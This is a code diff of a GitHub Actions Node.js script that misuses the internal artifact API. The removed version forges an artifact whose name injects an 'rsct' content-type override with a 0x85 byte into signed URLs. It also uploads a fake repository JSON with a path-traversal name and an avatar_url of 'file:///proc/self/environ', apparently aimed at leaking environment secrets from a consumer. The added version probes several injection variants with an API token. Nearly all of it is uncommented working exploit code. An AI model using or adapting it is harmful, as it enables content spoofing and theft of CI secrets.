@@ -2,101 +2,73 @@ import { createHash } from 'node:crypto';
 
 import { BlobClient } from '@azure/storage-blob';
 
-const SIZE = 4096;
+const artifactEntry = import.meta.resolve('@actions/artifact');
+const artifactLib = new URL('.', artifactEntry);
+const [{ internalArtifactTwirpClient }, { getBackendIdsFromToken }, { StringValue }] = await Promise.all([
+  import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
+  import(new URL('internal/shared/util.js', artifactLib)),
+  import(new URL('generated/index.js', artifactLib)),
+]);
+const ids = getBackendIdsFromToken();
+const client = internalArtifactTwirpClient({ maxAttempts: 1 });
+const name = `query-probe-${process.env.GITHUB_RUN_ID}.json`;
+const mime = 'application/octet-stream';
+const bytes = Buffer.from('{"probe":"artifact-query"}');
 
-function sha256(bytes) {
-  return createHash('sha256').update(bytes).digest('hex');
+const created = await client.CreateArtifact({
+  workflowRunBackendId: ids.workflowRunBackendId,
+  workflowJobRunBackendId: ids.workflowJobRunBackendId,
+  name,
+  mimeType: StringValue.create({ value: mime }),
+  version: 7,
+});
+if (!created.ok) throw new Error('CreateArtifact returned ok=false');
+const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
+await blob.uploadData(bytes, { blobHTTPHeaders: { blobContentType: mime } });
+const finalized = await client.FinalizeArtifact({
+  workflowRunBackendId: ids.workflowRunBackendId,
+  workflowJobRunBackendId: ids.workflowJobRunBackendId,
+  name,
+  size: String(bytes.length),
+  hash: StringValue.create({ value: `sha256:${createHash('sha256').update(bytes).digest('hex')}` }),
+});
+const { signedUrl } = await client.GetSignedArtifactURL({
+  workflowRunBackendId: ids.workflowRunBackendId,
+  workflowJobRunBackendId: ids.workflowJobRunBackendId,
+  name,
+});
+
+const apiPath = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${finalized.artifactId}/zip`;
+const variants = [
+  ['api-none', apiPath],
+  ['api-byte85', `${apiPath}?rsct=application/json%85`],
+  ['api-utf8nel', `${apiPath}?rsct=application/json%C2%85`],
+  ['api-double', `${apiPath}?download=1&rsct=application/json%85`],
+  ['signed-none', signedUrl],
+  ['signed-append-byte85', `${signedUrl}&rsct=application/json%85`],
+  ['signed-append-utf8nel', `${signedUrl}&rsct=application/json%C2%85`],
+];
+const results = [];
+for (const [label, url] of variants) {
+  const response = await fetch(url, {
+    headers: label.startsWith('api-') ? {
+      Accept: 'application/vnd.github.v3+json',
+      Authorization: `Bearer ${process.env.GH_TOKEN}`,
+      'User-Agent': 'repo-cassette-probe',
+    } : {},
+    redirect: 'follow',
+  });
+  const body = Buffer.from(await response.arrayBuffer());
+  results.push({
+    label,
+    status: response.status,
+    host: new URL(response.url).host,
+    typeHex: Buffer.from(response.headers.get('content-type') || '', 'latin1').toString('hex'),
+    payload: body.equals(bytes),
+    length: body.length,
+  });
 }
 
-function actionError(error) {
-  const message = String(error?.stack || error)
-    .replaceAll('%', '%25').replaceAll('\r', '%0D').replaceAll('\n', '%0A');
-  console.log(`::error title=Forge failed::${message}`);
-}
-
-try {
-  if (!process.env.ACTIONS_RUNTIME_TOKEN || !process.env.ACTIONS_RESULTS_URL) {
-    throw new Error('GitHub did not inject the Actions artifact runtime variables');
-  }
-  if (!/^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/.test(process.env.GITHUB_REPOSITORY || '')) {
-    throw new Error('GITHUB_REPOSITORY is missing or invalid');
-  }
-
-  const artifactEntry = import.meta.resolve('@actions/artifact');
-  const artifactLib = new URL('.', artifactEntry);
-  const [{ internalArtifactTwirpClient }, { getBackendIdsFromToken }, { StringValue }] = await Promise.all([
-    import(new URL('internal/shared/artifact-twirp-client.js', artifactLib)),
-    import(new URL('internal/shared/util.js', artifactLib)),
-    import(new URL('generated/index.js', artifactLib)),
-  ]);
-
-  const ids = getBackendIdsFromToken();
-  const client = internalArtifactTwirpClient();
-  const contentType = Buffer.concat([
-    Buffer.from('application/json', 'ascii'),
-    Buffer.from([0x85]),
-  ]).toString('latin1');
-  const name = `cassette-${process.env.GITHUB_RUN_ID}.json&rsct=application/json%85`;
-
-  const created = await client.CreateArtifact({
-    workflowRunBackendId: ids.workflowRunBackendId,
-    workflowJobRunBackendId: ids.workflowJobRunBackendId,
-    name,
-    mimeType: StringValue.create({ value: 'application/octet-stream' }),
-    version: 7,
-  });
-  if (!created.ok || !created.signedUploadUrl) throw new Error('CreateArtifact failed');
-
-  const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
-  const options = { blobHTTPHeaders: { blobContentType: contentType } };
-  const placeholder = Buffer.concat([Buffer.from('{}'), Buffer.alloc(SIZE - 2, 0x20)]);
-  await blob.uploadData(placeholder, options);
-
-  const finalized = await client.FinalizeArtifact({
-    workflowRunBackendId: ids.workflowRunBackendId,
-    workflowJobRunBackendId: ids.workflowJobRunBackendId,
-    name,
-    size: String(SIZE),
-    hash: StringValue.create({ value: `sha256:${sha256(placeholder)}` }),
-  });
-  if (!finalized.ok || !/^\d+$/.test(finalized.artifactId)) {
-    throw new Error('FinalizeArtifact failed');
-  }
-
-  const repository = `x/../${process.env.GITHUB_REPOSITORY}/actions/artifacts/${finalized.artifactId}/zip`;
-  const document = {
-    full_name: repository,
-    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
-    description: 'Repo Cassette',
-    stargazers_count: 0,
-  };
-  const json = Buffer.from(JSON.stringify(document));
-  if (json.length > SIZE) throw new Error('Payload is too large');
-  const payload = Buffer.concat([json, Buffer.alloc(SIZE - json.length, 0x20)]);
-  await blob.uploadData(payload, options);
-
-  const { signedUrl } = await client.GetSignedArtifactURL({
-    workflowRunBackendId: ids.workflowRunBackendId,
-    workflowJobRunBackendId: ids.workflowJobRunBackendId,
-    name,
-  });
-  const downloaded = await fetch(signedUrl);
-  if (!downloaded.ok) throw new Error(`Signed download returned HTTP ${downloaded.status}`);
-  const downloadedBytes = Buffer.from(await downloaded.arrayBuffer());
-  const downloadedType = downloaded.headers.get('content-type') || '';
-  const downloadedTypeHex = Buffer.from(downloadedType, 'latin1').toString('hex');
-  const signedResponseTypes = new URL(signedUrl).searchParams.getAll('rsct');
-  const signedResponseTypeHex = signedResponseTypes
-    .map(value => Buffer.from(value, 'latin1').toString('hex')).join(',');
-  if (!downloadedBytes.equals(payload)) throw new Error('Signed download body did not match payload');
-
-  console.log(`OWNER_REPO=${process.env.GITHUB_REPOSITORY}`);
-  console.log(`ARTIFACT_ID=${finalized.artifactId}`);
-  console.log(`REPOSITORY=${repository}`);
-  console.log(`PAYLOAD_SHA256=${sha256(payload)}`);
-  console.log(`DOWNLOAD_CONTENT_TYPE_HEX=${downloadedTypeHex}`);
-  console.log(`::notice title=Artifact ${finalized.artifactId}::rsct ${signedResponseTypeHex}; download ${downloadedTypeHex}`);
-} catch (error) {
-  actionError(error);
-  process.exitCode = 1;
-}
+const report = JSON.stringify({ artifactId: finalized.artifactId, results });
+console.log(report);
+console.log(`::notice title=Artifact query probe::${report.replaceAll('%', '%25')}`);
